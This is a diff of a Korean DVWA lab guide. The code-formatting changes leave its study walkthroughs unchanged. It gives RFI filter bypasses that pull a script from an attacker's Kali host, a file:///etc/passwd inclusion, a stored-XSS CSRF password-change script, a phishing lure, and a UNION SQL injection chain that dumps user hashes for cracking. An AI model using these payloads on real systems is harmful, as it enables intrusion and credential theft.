 <p>http:// 또는 https:// 처리 시, 만약 프로토콜이 HTTP 또는 HTTPS임을 정확하게 검증하지 않으면 다음과 같은 우회가 가능하다.</p>
 <p>우회 방법 1: 대소문자 혼용</p>
 <p>웹브라우저는 소문자, 대문자, 대소문자 혼용 여부와 관계없이 모두 동일한 프로토콜 (HTTP)로 인식하는 성질이 있다. 따라서 코드에서 대소문자를 구분하지 않고 모두 막도록 작성해야 하는데, 이 부분이 누락되어 있다면 다음과 같이 대문자를 섞어서 우회할 수 있다.</p>
-<div class="codehilite"><pre><span></span><code>?page=HTtp://[칼리IP]:8000/test.php
-</code></pre></div>
+<div class="code-shell" data-language="Text"><div class="code-toolbar"><span class="code-mark">⌘</span><span class="code-label">Text</span><button class="code-copy" type="button">복사</button></div><div class="codehilite"><pre><span></span><code>?page=HTtp://[칼리IP]:8000/test.php
+</code></pre></div></div>
 
 <p>우회 방법 2: 공백 처리를 활용한 문자열 재구성</p>
 <p>치환 함수가 http:// 를 공백으로 만들어 없애는 점을 역으로 이용하여, 중간에 한 번 더</p>
 <p>http:// 를 삽입한다.</p>
-<div class="codehilite"><pre><span></span><code>htthttp://p://[칼리IP]:8000/test.php
-</code></pre></div>
+<div class="code-shell" data-language="Text"><div class="code-toolbar"><span class="code-mark">⌘</span><span class="code-label">Text</span><button class="code-copy" type="button">복사</button></div><div class="codehilite"><pre><span></span><code>htthttp://p://[칼리IP]:8000/test.php
+</code></pre></div></div>
 
 <p>이 문자열에서 가운데에 들어간 http:// 가 공백 처리되어 사라지면, 앞의 'htt'와 뒤의 'p://'가 합쳐져서 다시 'http://'가 되어 정상적으로 경로가 인식된다.</p>
 <p>⚠️ 웹브라우저는 앞에 있는 프로토콜에 대해서 대소문자를 가리지 않고 무조건 HTTP 프로토콜로 인식한다. 관리자가 확실하게 막고 싶다면 대소문자를 가리지 않고 HTTP, HTTPS를 모두 막을 수 있도록 코딩해야 한다.</p>
@@ -1156,8 +1180,8 @@ Password: password (모두 소문자)
 <p>웹사이트에서 실행되는 파일들이 file1, file2, file3과 같이 "file"이라는 이름으로 시작하므 로, 뒤에는 어떤 문자가 와도 상관없다는 의미이다.</p>
 <h5 id="4-2_5">4-2. 공략 방법</h5>
 <p>"file"로 시작하면 되므로, file 프로토콜을 사용하여 경로를 지정하면 조건을 만족시켜 통과할 수 있다.</p>
-<div class="codehilite"><pre><span></span><code>?page=file:///etc/passwd
-</code></pre></div>
+<div class="code-shell" data-language="Text"><div class="code-toolbar"><span class="code-mark">⌘</span><span class="code-label">Text</span><button class="code-copy" type="button">복사</button></div><div class="codehilite"><pre><span></span><code>?page=file:///etc/passwd
+</code></pre></div></div>
 
 <p>위와 같이 file로 시작하는 형태로 작성하면 코드 검증에서 문제가 없으므로 명령어가 정상적으로 실행되는 것을 확인할 수 있다.</p>
 <p>⚠️ 하이레벨에서도 페이지 뒤에 file로 시작하도록 만들면 문제없이 파일 인클루전이 일 어난다.</p>
@@ -1646,20 +1670,20 @@ Password: password (모두 소문자)
 </table></div>
 <h5 id="2-2-xss-stored">2-2. XSS Stored를 활용한 공격</h5>
 <p>XSS Stored 페이지의 게시판 입력란에 아래와 같이 패스워드 변경 URL을 스크립트 태그로 삽입한다.</p>
-<div class="codehilite"><pre><span></span><code>&lt;!-- src 속성에 패스워드를 변경하는 CSRF URL을 삽입 --&gt;
+<div class="code-shell" data-language="Text"><div class="code-toolbar"><span class="code-mark">⌘</span><span class="code-label">Text</span><button class="code-copy" type="button">복사</button></div><div class="codehilite"><pre><span></span><code>&lt;!-- src 속성에 패스워드를 변경하는 CSRF URL을 삽입 --&gt;
 &lt;script&gt;window.location=&#39;&lt;http://대상IP/vulnerabilities/csr
 f/?password_new=공격자패스워드&amp;password_conf=공격자패스워드&amp;Chan
 ge=Change&gt;&#39;&lt;/script&gt;
-</code></pre></div>
+</code></pre></div></div>
 
 <p>관리자가 게시판에 접근하는 순간 스크립트가 실행되어 패스워드가 변경된다.</p>
 <h5 id="2-3_2">2-3. 메일을 활용한 피싱 공격</h5>
 <p>네이버, 다음 등 이메일 서비스에서 HTML 편집 모드를 사용하면 메일 본문에 HTML 코드를 삽입할 수 있다.</p>
-<div class="codehilite"><pre><span></span><code>&lt;!-- 이벤트 당첨 등 클릭을 유도하는 내용과 함께 CSRF URL 링크를 삽
+<div class="code-shell" data-language="Text"><div class="code-toolbar"><span class="code-mark">⌘</span><span class="code-label">Text</span><button class="code-copy" type="button">복사</button></div><div class="codehilite"><pre><span></span><code>&lt;!-- 이벤트 당첨 등 클릭을 유도하는 내용과 함께 CSRF URL 링크를 삽
 입 --&gt;
 이벤트 당첨을 확인해 주세요.
 주소를 확인해 주세요.
-</code></pre></div>
+</code></pre></div></div>
 
 <p>수신인란에 관리자 이메일을 입력하고 제목에 "이벤트에 당첨되었습니다" 등 클릭을 유도하는 문구를 작성한다. 본문에 HTML 방식으로 CSRF URL 링크를 삽입하여 발송한다.</p>
 <p>관리자가 메일을 받고 링크를 클릭하면 패스워드가 공격자가 원하는 값으로 변경된다. 문자 메시지를 보내서 유도하거나, HTML·스크립트가 들어갈 수 있는 것들을 동원하는 방식으로도 가능하다.</p>
@@ -1667,18 +1691,18 @@ ge=Change&gt;&#39;&lt;/script&gt;
 <p>어드민의 원래 패스워드는 password 이지만, 테스트로 test 라고 변경한 후 test 로 로그인하면 정상적으로 로그인이 된ᓼ을 확인할 수 있다.</p>
 <h5 id="2-5_1">2-5. 코드 분석</h5>
 <p>Low 레벨 코드는 사용자로부터 password_new 와 password_conf  두 값을 받아 일치하면 UPDATE 쿼리로 패스워드를 업데이트한다. 입력 값에 대한 어떠한 검증 작업도 없다.</p>
-<div class="codehilite"><pre><span></span><code>// 두 패스워드 값이 일치하면 UPDATE 쿼리 실행
+<div class="code-shell" data-language="SQL"><div class="code-toolbar"><span class="code-mark">⌘</span><span class="code-label">SQL</span><button class="code-copy" type="button">복사</button></div><div class="codehilite"><pre><span></span><code>// 두 패스워드 값이 일치하면 UPDATE 쿼리 실행
 // 검증 없이 그대로 UPDATE
 // 일치하지 않으면 &quot;Passwords did not match&quot; 출력
-</code></pre></div>
+</code></pre></div></div>
 
 <h4 id="3-medium-레벨">3. Medium 레벨</h4>
 <h5 id="3-1_9">3-1. 보안 조치</h5>
 <p>Medium 레벨에서는 eregi()  함수를 사용하여 서버 도메인 주소와 HTTP Referer(참조) 주소를 대소문자 구분 없이 비교하는 코드가 추가된다.</p>
-<div class="codehilite"><pre><span></span><code>// 대소문자 구분 없이 서버 도메인과 Referer 주소 비교
+<div class="code-shell" data-language="Text"><div class="code-toolbar"><span class="code-mark">⌘</span><span class="code-label">Text</span><button class="code-copy" type="button">복사</button></div><div class="codehilite"><pre><span></span><code>// 대소문자 구분 없이 서버 도메인과 Referer 주소 비교
 eregi(SERVER_NAME, HTTP_REFERER)
 // 이외 쿼리 문은 Low 레벨과 동일
-</code></pre></div>
+</code></pre></div></div>
 
 <h5 id="3-2_9">3-2. 취약점 지속 여부</h5>
 <p>XSS Stored 취약점이 있는 게시판은 동일한 서버 도메인에서 동작하므로, 스크립트가 실행될 때의 Referer도 동일한 도메인이 된다. 따라서 Low 레벨과 동일한 방법으로 우회가 가능하다.</p>
@@ -1689,10 +1713,10 @@ eregi(SERVER_NAME, HTTP_REFERER)
 <h5 id="4-2_8">4-2. 취약점 지속 여부</h5>
 <p>어드민으로 로그인된 상태에서 토큰 정보가 유지되고 있다면, 해당 토큰을 활용하여 XSS Stored와 동일하게 작업이 가능하다.</p>
 <h5 id="4-3_4">4-3. 코드 분석</h5>
-<div class="codehilite"><pre><span></span><code>// 사용자 토큰 정보 확인
+<div class="code-shell" data-language="Text"><div class="code-toolbar"><span class="code-mark">⌘</span><span class="code-label">Text</span><button class="code-copy" type="button">복사</button></div><div class="codehilite"><pre><span></span><code>// 사용자 토큰 정보 확인
 // 마지막에 기존 토큰 삭제 후 새 토큰 생성
 generate_session_token()
-</code></pre></div>
+</code></pre></div></div>
 
 <p>토큰 확인 로직이 추가된 것과 마지막에 새로운 토큰을 생성하는 함수가 추가된 것 외에는 Low 레벨과 동일하다.</p>
 <h4 id="5-impossible-레벨">5. Impossible 레벨</h4>
@@ -1701,10 +1725,10 @@ generate_session_token()
 <h5 id="5-2_3">5-2. 방어 효과</h5>
 <p>공격자가 현재의 패스워드를 모르는 상황에서는 패스워드 변경이 이루어지지 않는다. 관리 자에게 요청을 대행하더라도 현재 패스워드 입력이 필요하므로 공격 자체가 성립하지 않는다.</p>
 <h5 id="5-3">5-3. 코드 분석</h5>
-<div class="codehilite"><pre><span></span><code>// password_current 파라미터를 추가로 받아서
+<div class="code-shell" data-language="SQL"><div class="code-toolbar"><span class="code-mark">⌘</span><span class="code-label">SQL</span><button class="code-copy" type="button">복사</button></div><div class="codehilite"><pre><span></span><code>// password_current 파라미터를 추가로 받아서
 // 현재 어드민 패스워드와 일치 여부 확인
 // 일치해야만 새 패스워드 두 개 비교 후 UPDATE 진행
-</code></pre></div>
+</code></pre></div></div>
 
 <h4 id="6-csrf-종합-정리">6. CSRF 종합 정리</h4>
 <p>CSRF 취약점이 발생하는 근본적인 이유는 관리자가 패스워드를 변경할 때 현재의 패스워드를 묻지 않는다는 것이다. 취약점 대응 방안은 아래와 같이 정리된다.</p>
@@ -1760,49 +1784,49 @@ generate_session_token()
 <p>Ubuntu/Debian 계열은 apt 를 사용한다. Rocky Linux 계열은 dnf 를 사용하며, 웹 서버 패키지명도 apache2  대신 httpd 를 사용한다.</p>
 <h4 id="2-시스템-업데이트">2. 시스템 업데이트</h4>
 <p>설치 전 패키지 목록을 최신 상태로 업데이트한다.</p>
-<div class="codehilite"><pre><span></span><code>sudo apt update
+<div class="code-shell" data-language="Shell"><div class="code-toolbar"><span class="code-mark">⌘</span><span class="code-label">Shell</span><button class="code-copy" type="button">복사</button></div><div class="codehilite"><pre><span></span><code>sudo apt update
 sudo apt upgrade
-</code></pre></div>
+</code></pre></div></div>
 
 <h4 id="3-패키지-설치">3. 패키지 설치</h4>
-<div class="codehilite"><pre><span></span><code>sudo apt install apache2 mariadb-server php php-mysqli php-
+<div class="code-shell" data-language="Shell"><div class="code-toolbar"><span class="code-mark">⌘</span><span class="code-label">Shell</span><button class="code-copy" type="button">복사</button></div><div class="codehilite"><pre><span></span><code>sudo apt install apache2 mariadb-server php php-mysqli php-
 gd libapache2-mod-php git
-</code></pre></div>
+</code></pre></div></div>
 
 <p>설치가 완료되면 Apache2, MariaDB, PHP, Git이 모두 설치된다.</p>
 <h4 id="4-mariadb-설정">4. MariaDB 설정</h4>
 <h5 id="4-1-mariadb">4-1. MariaDB 서비스 시작</h5>
-<div class="codehilite"><pre><span></span><code>sudo systemctl start mariadb
-</code></pre></div>
+<div class="code-shell" data-language="Shell"><div class="code-toolbar"><span class="code-mark">⌘</span><span class="code-label">Shell</span><button class="code-copy" type="button">복사</button></div><div class="codehilite"><pre><span></span><code>sudo systemctl start mariadb
+</code></pre></div></div>
 
 <h5 id="4-2-mariadb">4-2. MariaDB 접속</h5>
-<div class="codehilite"><pre><span></span><code># root 사용자로 접속 (초기 설치 시 패스워드 없음)
+<div class="code-shell" data-language="Shell"><div class="code-toolbar"><span class="code-mark">⌘</span><span class="code-label">Shell</span><button class="code-copy" type="button">복사</button></div><div class="codehilite"><pre><span></span><code># root 사용자로 접속 (초기 설치 시 패스워드 없음)
 mysql -u root -p
 # 패스워드 입력란에서 엔터만 입력
-</code></pre></div>
+</code></pre></div></div>
 
 <p>보안 설치(mysql_secure_installation)를 진행하지 않은 경우 root 패스워드가 없다. 이후 필요하다면 보안 설치를 통해 패스워드를 설정할 수 있다.</p>
 <h5 id="4-3_5">4-3. 데이터베이스 생성</h5>
-<div class="codehilite"><pre><span></span><code>-- dvwa 데이터베이스 생성
+<div class="code-shell" data-language="SQL"><div class="code-toolbar"><span class="code-mark">⌘</span><span class="code-label">SQL</span><button class="code-copy" type="button">복사</button></div><div class="codehilite"><pre><span></span><code>-- dvwa 데이터베이스 생성
 CREATE DATABASE dvwa;
 -- 생성 결과 확인
 SHOW DATABASES;
-</code></pre></div>
+</code></pre></div></div>
 
 <p>SHOW DATABASES  실행 시 information_schema  등 기본 생성 DB와 함께 dvwa 가 목록에 나타난다.</p>
 <p>information_schema  DB 안에는 tables , columns  등의 테이블이 존재하며, 각 테이블에 는 table_name , column_name  등의 칼럼이 있다.</p>
 <h5 id="4-4">4-4. 사용자 생성</h5>
-<div class="codehilite"><pre><span></span><code>-- dvwa 계정을 localhost에서만 접근 가능하도록 생성
+<div class="code-shell" data-language="SQL"><div class="code-toolbar"><span class="code-mark">⌘</span><span class="code-label">SQL</span><button class="code-copy" type="button">복사</button></div><div class="codehilite"><pre><span></span><code>-- dvwa 계정을 localhost에서만 접근 가능하도록 생성
 -- 패스워드는 dvwa123으로 지정
 CREATE USER &#39;dvwa&#39;@&#39;localhost&#39; IDENTIFIED BY &#39;dvwa123&#39;;
-</code></pre></div>
+</code></pre></div></div>
 
 <h5 id="4-5">4-5. 권한 부여</h5>
-<div class="codehilite"><pre><span></span><code>-- dvwa 데이터베이스의 모든 테이블에 대해 모든 권한 부여
+<div class="code-shell" data-language="SQL"><div class="code-toolbar"><span class="code-mark">⌘</span><span class="code-label">SQL</span><button class="code-copy" type="button">복사</button></div><div class="codehilite"><pre><span></span><code>-- dvwa 데이터베이스의 모든 테이블에 대해 모든 권한 부여
 GRANT ALL PRIVILEGES ON dvwa.* TO &#39;dvwa&#39;@&#39;localhost&#39;;
 -- 권한 설정 즉시 적용
 FLUSH PRIVILEGES;
-</code></pre></div>
+</code></pre></div></div>
 
 <div class="tablewrap"><table>
 <thead>
@@ -1831,39 +1855,39 @@ FLUSH PRIVILEGES;
 </tbody>
 </table></div>
 <h5 id="4-6-mariadb">4-6. MariaDB 종료</h5>
-<div class="codehilite"><pre><span></span><code>exit
-</code></pre></div>
+<div class="code-shell" data-language="Text"><div class="code-toolbar"><span class="code-mark">⌘</span><span class="code-label">Text</span><button class="code-copy" type="button">복사</button></div><div class="codehilite"><pre><span></span><code>exit
+</code></pre></div></div>
 
 <h4 id="5-dvwa-소스-다운로드">5. DVWA 소스 다운로드</h4>
 <p>웹 서버의 기본 Document Root 디렉토리로 이동한 후 GitHub에서 DVWA를 클론한다.</p>
-<div class="codehilite"><pre><span></span><code># Apache의 기본 Document Root 디렉토리로 이동
+<div class="code-shell" data-language="Shell"><div class="code-toolbar"><span class="code-mark">⌘</span><span class="code-label">Shell</span><button class="code-copy" type="button">복사</button></div><div class="codehilite"><pre><span></span><code># Apache의 기본 Document Root 디렉토리로 이동
 cd /var/www/html
 # GitHub에서 DVWA 클론 (DVWA는 대문자)
 git clone &lt;https://github.com/digininja/DVWA&gt;
-</code></pre></div>
+</code></pre></div></div>
 
 <p>클론 완료 후 ls  명령으로 DVWA  디렉토리가 생성되었는지 확인한다.</p>
-<div class="codehilite"><pre><span></span><code>ls
+<div class="code-shell" data-language="Shell"><div class="code-toolbar"><span class="code-mark">⌘</span><span class="code-label">Shell</span><button class="code-copy" type="button">복사</button></div><div class="codehilite"><pre><span></span><code>ls
 # DVWA 디렉토리 확인
 cd DVWA
-</code></pre></div>
+</code></pre></div></div>
 
 <p>접속 주소 구조는 아래와 같다.</p>
-<div class="codehilite"><pre><span></span><code>http://[Ubuntu IP]/DVWA/
-</code></pre></div>
+<div class="code-shell" data-language="Text"><div class="code-toolbar"><span class="code-mark">⌘</span><span class="code-label">Text</span><button class="code-copy" type="button">복사</button></div><div class="codehilite"><pre><span></span><code>http://[Ubuntu IP]/DVWA/
+</code></pre></div></div>
 
 <h4 id="6-dvwa-설정-파일-수정">6. DVWA 설정 파일 수정</h4>
 <h5 id="6-1_1">6-1. 설정 파일 복사</h5>
-<div class="codehilite"><pre><span></span><code>cd config
+<div class="code-shell" data-language="Shell"><div class="code-toolbar"><span class="code-mark">⌘</span><span class="code-label">Shell</span><button class="code-copy" type="button">복사</button></div><div class="codehilite"><pre><span></span><code>cd config
 ls
 # config.inc.php.dist 파일 확인
 # .dist 확장자를 제거하여 실제 설정 파일 생성
 cp config.inc.php.dist config.inc.php
-</code></pre></div>
+</code></pre></div></div>
 
 <h5 id="6-2_2">6-2. 설정 파일 편집</h5>
-<div class="codehilite"><pre><span></span><code>sudo vi config.inc.php
-</code></pre></div>
+<div class="code-shell" data-language="Shell"><div class="code-toolbar"><span class="code-mark">⌘</span><span class="code-label">Shell</span><button class="code-copy" type="button">복사</button></div><div class="codehilite"><pre><span></span><code>sudo vi config.inc.php
+</code></pre></div></div>
 
 <p>수정해야 하는 항목은 다음과 같다.</p>
 <div class="tablewrap"><table>
@@ -1905,11 +1929,11 @@ cp config.inc.php.dist config.inc.php
 <p>⚠️ db_server 에 Ubuntu 머신의 실제 IP 주소를 입력하면 연결 오류가 발생할 수 있다. 동일 머신 내 DB를 사용하므로 127.0.0.1 (로컬호스트)로 설정해야 한다.</p>
 <h4 id="7-디렉토리-권한-설정">7. 디렉토리 권한 설정</h4>
 <p>웹에서 접근하는 디렉토리의 소유자가 root로 되어 있으면 보안 문제가 발생할 수 있다. 웹서버 기본 계정( www-data )으로 소유자를 변경하고 권한을 설정한다.</p>
-<div class="codehilite"><pre><span></span><code># 소유자 및 그룹을 www-data로 변경 (-R: 하위 디렉토리 포함)
+<div class="code-shell" data-language="Shell"><div class="code-toolbar"><span class="code-mark">⌘</span><span class="code-label">Shell</span><button class="code-copy" type="button">복사</button></div><div class="codehilite"><pre><span></span><code># 소유자 및 그룹을 www-data로 변경 (-R: 하위 디렉토리 포함)
 sudo chown -R www-data:www-data /var/www/html/DVWA
 # 755 권한 적용 (-R: 하위 디렉토리 포함)
 sudo chmod -R 755 /var/www/html/DVWA
-</code></pre></div>
+</code></pre></div></div>
 
 <div class="tablewrap"><table>
 <thead>
@@ -1939,9 +1963,9 @@ sudo chmod -R 755 /var/www/html/DVWA
 </table></div>
 <h4 id="8-php-설정-수정">8. PHP 설정 수정</h4>
 <p>PHP 환경 설정 파일을 수정하여 실습에 필요한 기능을 활성화한다.</p>
-<div class="codehilite"><pre><span></span><code># PHP 설정 파일 경로 (Ubuntu 24 기준, PHP 8.3)
+<div class="code-shell" data-language="Shell"><div class="code-toolbar"><span class="code-mark">⌘</span><span class="code-label">Shell</span><button class="code-copy" type="button">복사</button></div><div class="codehilite"><pre><span></span><code># PHP 설정 파일 경로 (Ubuntu 24 기준, PHP 8.3)
 sudo vi /etc/php/8.3/apache2/php.ini
-</code></pre></div>
+</code></pre></div></div>
 
 <p>PHP 버전에 따라 경로의 버전 번호가 달라진다. (예: 7.6 버전이면</p>
 <p>/etc/php/7.6/apache2/php.ini )</p>
@@ -1970,35 +1994,35 @@ sudo vi /etc/php/8.3/apache2/php.ini
 </tr>
 </tbody>
 </table></div>
-<div class="codehilite"><pre><span></span><code>; 518번 라인 근처
+<div class="code-shell" data-language="Text"><div class="code-toolbar"><span class="code-mark">⌘</span><span class="code-label">Text</span><button class="code-copy" type="button">복사</button></div><div class="codehilite"><pre><span></span><code>; 518번 라인 근처
 display_errors = On
 ; 880번 라인 근처
 allow_url_include = On
-</code></pre></div>
+</code></pre></div></div>
 
 <p>⚠️ display_errors = On 은 개발·테스트 환경에서만 사용한다. 실제 서비스 배포 전에는 반드시 Off 로 변경해야 한다. 에러 메시지가 외부에 노출되면 공격자가 이를 이용하여 시스템 정보를 수집할 수 있다.</p>
 <h4 id="9-서비스-시작-및-접속-확인">9. 서비스 시작 및 접속 확인</h4>
 <h5 id="9-1">9-1. 서비스 시작</h5>
-<div class="codehilite"><pre><span></span><code># Apache 웹 서버 시작
+<div class="code-shell" data-language="Shell"><div class="code-toolbar"><span class="code-mark">⌘</span><span class="code-label">Shell</span><button class="code-copy" type="button">복사</button></div><div class="codehilite"><pre><span></span><code># Apache 웹 서버 시작
 sudo systemctl start apache2
 # MariaDB 서비스 시작 (앞서 이미 시작한 경우 생략)
 sudo systemctl start mariadb
 # 상태 확인
 sudo systemctl status apache2
 sudo systemctl status mariadb
-</code></pre></div>
+</code></pre></div></div>
 
 <h5 id="9-2-db-setupphp">9-2. 초기 DB 구성 (setup.php)</h5>
 <p>칼리 등 다른 머신의 웹 브라우저에서 setup.php에 접속한다.</p>
-<div class="codehilite"><pre><span></span><code>http://[Ubuntu IP]/DVWA/setup.php
-</code></pre></div>
+<div class="code-shell" data-language="Text"><div class="code-toolbar"><span class="code-mark">⌘</span><span class="code-label">Text</span><button class="code-copy" type="button">복사</button></div><div class="codehilite"><pre><span></span><code>http://[Ubuntu IP]/DVWA/setup.php
+</code></pre></div></div>
 
 <p>페이지 하단의 Create/Reset Database 버튼을 클릭한다. 오류 없이 완료되면 자동으로 로그인 페이지로 이동한다.</p>
 <h5 id="9-3">9-3. 로그인</h5>
-<div class="codehilite"><pre><span></span><code>http://[Ubuntu IP]/DVWA/
+<div class="code-shell" data-language="Text"><div class="code-toolbar"><span class="code-mark">⌘</span><span class="code-label">Text</span><button class="code-copy" type="button">복사</button></div><div class="codehilite"><pre><span></span><code>http://[Ubuntu IP]/DVWA/
 기본 계정: admin
 기본 패스워드: password
-</code></pre></div>
+</code></pre></div></div>
 
 <h4 id="10-새로운-dvwa의-추가-항목">10. 새로운 DVWA의 추가 항목</h4>
 <p>기존 ISO 파일 기반 DVWA와 비교하여 GitHub 최신 버전 DVWA에서 추가된 항목이 있다.</p>
@@ -2096,25 +2120,25 @@ sudo systemctl status mariadb
 <p>나중에 인코딩된 값을 활용하여 공격하는 방법들도 존재한다.</p>
 <h5 id="3-3_4">3-3. 에러 기반 점검</h5>
 <p>작은 따옴표를 삽입하여 강제로 문법 오류를 발생시킨다.</p>
-<div class="codehilite"><pre><span></span><code>5&#39;
-</code></pre></div>
+<div class="code-shell" data-language="Text"><div class="code-toolbar"><span class="code-mark">⌘</span><span class="code-label">Text</span><button class="code-copy" type="button">복사</button></div><div class="codehilite"><pre><span></span><code>5&#39;
+</code></pre></div></div>
 
 <p>실행 결과 You have an error in your SQL syntax  메시지가 출력된다. 잘못된 쿼리 문을 전달 하더라도 DB 시스템이 에러 메시지로 반응한다는 것을 확인할 수 있다. 이러한 경우 SQL 인젝션 취약점이 존재할 가능성이 높아진다.</p>
 <h5 id="3-4_4">3-4. 불린 기반 점검</h5>
 <p>OR 연산자를 이용하여 전체 조건을 참(true)으로 만드는 쿼리를 삽입한다.</p>
-<div class="codehilite"><pre><span></span><code>-- &#39;1&#39;=&#39;1&#39; 은 참, OR 연산으로 전체 조건이 참이 된다
+<div class="code-shell" data-language="Text"><div class="code-toolbar"><span class="code-mark">⌘</span><span class="code-label">Text</span><button class="code-copy" type="button">복사</button></div><div class="codehilite"><pre><span></span><code>-- &#39;1&#39;=&#39;1&#39; 은 참, OR 연산으로 전체 조건이 참이 된다
 5&#39; OR &#39;1&#39;=&#39;1
-</code></pre></div>
+</code></pre></div></div>
 
 <p>뒤에 주석 처리를 추가하면 그 이후 구문을 무력화할 수 있다.</p>
-<div class="codehilite"><pre><span></span><code>-- # 또는 -- 로 주석 처리
+<div class="code-shell" data-language="Text"><div class="code-toolbar"><span class="code-mark">⌘</span><span class="code-label">Text</span><button class="code-copy" type="button">복사</button></div><div class="codehilite"><pre><span></span><code>-- # 또는 -- 로 주석 처리
 5&#39; OR &#39;1&#39;=&#39;1&#39; #
-</code></pre></div>
+</code></pre></div></div>
 
 <p>실행 결과, 아이디 5번뿐만 아니라 전체 5개 계정 정보가 모두 출력된다. 현재 Low 레벨에서는 SQL 쿼리 문에 대한 어떠한 입력을 하더라도 DB가 반응하도록 설계되어 있음을 확인할 수 있다.</p>
 <h5 id="3-5-union-select">3-5. 칼럼 수 확인 (Union Select)</h5>
 <p>Union Select는 다수의 SELECT 조회 결과를 하나로 합쳐주는 쿼리 문이다. 이때 칼럼의 수가 일치해야만 정상 동작한다.</p>
-<div class="codehilite"><pre><span></span><code>-- 칼럼이 1개인지 확인
+<div class="code-shell" data-language="SQL"><div class="code-toolbar"><span class="code-mark">⌘</span><span class="code-label">SQL</span><button class="code-copy" type="button">복사</button></div><div class="codehilite"><pre><span></span><code>-- 칼럼이 1개인지 확인
 5&#39; UNION SELECT 1 #
 -- → 에러: &quot;The used SELECT statements have a different num
 ber of columns&quot;
@@ -2124,12 +2148,12 @@ ber of columns&quot;
 -- 칼럼이 3개인지 확인
 5&#39; UNION SELECT 1,2,3 #
 -- → 다시 칼럼 수 오류: 칼럼은 2개로 확정
-</code></pre></div>
+</code></pre></div></div>
 
 <h5 id="3-6-db">3-6. DB 버전 정보 확인</h5>
 <p>두 번째 칼럼 자리에 @@version  함수를 삽입하여 DB 버전을 출력한다.</p>
-<div class="codehilite"><pre><span></span><code>5&#39; UNION SELECT 1,@@version #
-</code></pre></div>
+<div class="code-shell" data-language="SQL"><div class="code-toolbar"><span class="code-mark">⌘</span><span class="code-label">SQL</span><button class="code-copy" type="button">복사</button></div><div class="codehilite"><pre><span></span><code>5&#39; UNION SELECT 1,@@version #
+</code></pre></div></div>
 
 <p>실행 결과 예시: 5.1.54-log  → MySQL 계열 DBMS임을 확인. 버전을 검색 엔진에서 검색하면 해당 버전의 CVE 취약점 코드를 확인할 수 있으며, exploitdb 사이트에서 공격 코드를 조회할 수 있다.</p>
 <h5 id="3-7">3-7. 데이터베이스 목록 확인</h5>
@@ -2157,59 +2181,59 @@ ber of columns&quot;
 </tbody>
 </table></div>
 <p>information_schema  내 tables  테이블의 table_schema  칼럼에서 DB 목록을 조회한다.</p>
-<div class="codehilite"><pre><span></span><code>5&#39; UNION SELECT table_schema,2 FROM information_schema.tabl
+<div class="code-shell" data-language="SQL"><div class="code-toolbar"><span class="code-mark">⌘</span><span class="code-label">SQL</span><button class="code-copy" type="button">복사</button></div><div class="codehilite"><pre><span></span><code>5&#39; UNION SELECT table_schema,2 FROM information_schema.tabl
 es #
-</code></pre></div>
+</code></pre></div></div>
 
 <p>실행 결과: information_schema , dvwa , mysql  세 개의 데이터베이스 확인.</p>
 <h5 id="3-8">3-8. 테이블 목록 확인</h5>
 <p>dvwa 데이터베이스 안에 어떤 테이블이 있는지 확인한다. table_name  칼럼을 조회하되</p>
 <p>WHERE 절로 dvwa DB만 필터링한다.</p>
-<div class="codehilite"><pre><span></span><code>5&#39; UNION SELECT 1,table_name FROM information_schema.tables
+<div class="code-shell" data-language="SQL"><div class="code-toolbar"><span class="code-mark">⌘</span><span class="code-label">SQL</span><button class="code-copy" type="button">복사</button></div><div class="codehilite"><pre><span></span><code>5&#39; UNION SELECT 1,table_name FROM information_schema.tables
 WHERE table_schema=&#39;dvwa&#39; #
-</code></pre></div>
+</code></pre></div></div>
 
 <p>실행 결과: guestbook , users  두 개의 테이블 확인. 공격자 입장에서 users  테이블에 중요한 정보가 들어가 있을 가능성이 높다.</p>
 <h5 id="3-9">3-9. 칼럼 목록 확인</h5>
 <p>information_schema  내 columns  테이블의 column_name  칼럼에서 users 테이블의 칼럼 목록을 조회한다.</p>
-<div class="codehilite"><pre><span></span><code>5&#39; UNION SELECT 1,column_name FROM information_schema.colum
+<div class="code-shell" data-language="SQL"><div class="code-toolbar"><span class="code-mark">⌘</span><span class="code-label">SQL</span><button class="code-copy" type="button">복사</button></div><div class="codehilite"><pre><span></span><code>5&#39; UNION SELECT 1,column_name FROM information_schema.colum
 ns WHERE table_name=&#39;users&#39; #
-</code></pre></div>
+</code></pre></div></div>
 
 <p>실행 결과: user_id , first_name , last_name , user , password , avatar , last_login ,</p>
 <p>failed_login  등 다수의 칼럼 확인. user 와 password  칼럼에 계정 정보가 존재할 것으로 판단한다.</p>
 <h5 id="3-10">3-10. 계정 정보 추출</h5>
 <p>dvwa.users 테이블에서 user와 password 칼럼을 직접 조회한다.</p>
-<div class="codehilite"><pre><span></span><code>5&#39; UNION SELECT user,password FROM dvwa.users #
-</code></pre></div>
+<div class="code-shell" data-language="SQL"><div class="code-toolbar"><span class="code-mark">⌘</span><span class="code-label">SQL</span><button class="code-copy" type="button">복사</button></div><div class="codehilite"><pre><span></span><code>5&#39; UNION SELECT user,password FROM dvwa.users #
+</code></pre></div></div>
 
 <p>실행 결과: admin부터 smithy까지 전체 계정명과 해시화된 패스워드 값 출력. 패스워드가 코드화(해시)되어 있음을 확인한다.</p>
 <h5 id="3-11">3-11. 해시 방식 확인 및 크래킹</h5>
 <p>추출한 계정 정보를 파일로 저장한다.</p>
-<div class="codehilite"><pre><span></span><code># 파일 생성 (계정명:해시값 형식으로 작성)
+<div class="code-shell" data-language="Shell"><div class="code-toolbar"><span class="code-mark">⌘</span><span class="code-label">Shell</span><button class="code-copy" type="button">복사</button></div><div class="codehilite"><pre><span></span><code># 파일 생성 (계정명:해시값 형식으로 작성)
 vi dvwa.txt
-</code></pre></div>
+</code></pre></div></div>
 
 <p>파일 내용 형식 예시:</p>
-<div class="codehilite"><pre><span></span><code>admin:해시값
+<div class="code-shell" data-language="Text"><div class="code-toolbar"><span class="code-mark">⌘</span><span class="code-label">Text</span><button class="code-copy" type="button">복사</button></div><div class="codehilite"><pre><span></span><code>admin:해시값
 gordonb:해시값
 1337:해시값
 pablo:해시값
 smithy:해시값
-</code></pre></div>
+</code></pre></div></div>
 
 <p>⚠️ 패스워드 값 복사 시 공백이나 다른 문자가 포함되지 않도록 주의해야 한다. admin과 smithy는 해싱된 값이 동일하므로 크래킹 결과도 동일한 패스워드가 나온다.</p>
 <p>해시 방식을 확인한다. 5개 계정 중 아무 해시 값이나 하나를 입력하면 된다.</p>
-<div class="codehilite"><pre><span></span><code># hash-identifier 도구로 해시 방식 판별
